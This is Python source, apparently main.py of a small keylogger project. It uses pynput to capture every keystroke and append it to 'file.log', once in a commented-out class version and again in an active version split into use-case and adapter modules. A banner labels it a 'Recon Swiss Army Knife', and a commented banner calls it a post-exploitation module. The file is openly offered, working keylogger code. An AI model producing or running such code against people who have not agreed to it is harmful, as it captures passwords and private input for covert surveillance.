# from pynput.keyboard import Key, Listener

# class KeyLogger:
#     def __init__(self, log_file):
#         self.log_file = log_file

#     def _write_to_log(self, key):
#         try:
#             with open(self.log_file, 'a') as f:
#                 f.write('{}\n'.format(key.char))
#         except AttributeError:
#             with open(self.log_file, 'a') as f:
#                 f.write('{}\n'.format(key))

#     def on_press(self, key):
#         self._write_to_log(key)

# def main():
#     log_file = 'file.log'
#     key_logger = KeyLogger(log_file)

#     with Listener(on_press=key_logger.on_press) as listener:
#         listener.join()

# if __name__ == "__main__":
#     main()

# main.py
from pynput.keyboard import Listener
from entities import KeyPress
from use_cases import RegisterKeyPress
from adapters import FileLogOutputPort

# def printbanner():
#     banner = """\
#      _..---.--.    __   __        _   _
#    .'\ __|/O.__)   \ \ / /__ _ __| |_| | ___
#   /__.' _/ .-'_\    \ V / _ \ '__| __| |/ _ \.
#  (____.'.-_\____)    | |  __/ |  | |_| |  __/
#   (_/ _)__(_ \_)\_   |_|\___|_|   \__|_|\___|
#    (_..)--(.._)'--'         ~n00py~
#       Post-exploitation Module for Wordpress
#                      v.1.1.0
#     """
#     print(banner)

def printbanner():
    print("""


 ▄▄▄        ██████  ██░ ██  ▒█████   ██ ▄█▀
▒████▄    ▒██    ▒ ▓██░ ██▒▒██▒  ██▒ ██▄█▒ 
▒██  ▀█▄  ░ ▓██▄   ▒██▀▀██░▒██░  ██▒▓███▄░ 
░██▄▄▄▄██   ▒   ██▒░▓█ ░██ ▒██   ██░▓██ █▄ 
 ▓█   ▓██▒▒██████▒▒░▓█▒░██▓░ ████▓▒░▒██▒ █▄
 ▒▒   ▓▒█░▒ ▒▓▒ ▒ ░ ▒ ░░▒░▒░ ▒░▒░▒░ ▒ ▒▒ ▓▒
  ▒   ▒▒ ░░ ░▒  ░ ░ ▒ ░▒░ ░  ░ ▒ ▒░ ░ ░▒ ▒░
  ░   ▒   ░  ░  ░   ░  ░░ ░░ ░ ░ ▒  ░ ░░ ░  > Recon Swiss Army Knife
      ░  ░      ░   ░  ░  ░    ░ ░  ░  ░      v1.1   
""")

def main():
    printbanner()
    log_file = 'file.log'
    output_port = FileLogOutputPort(log_file)
    register_key_press = RegisterKeyPress(output_port)

    def on_press(key):
        key_press = KeyPress(key.char if hasattr(key, 'char') else key)
        register_key_press.execute(key_press)

    with Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    main()
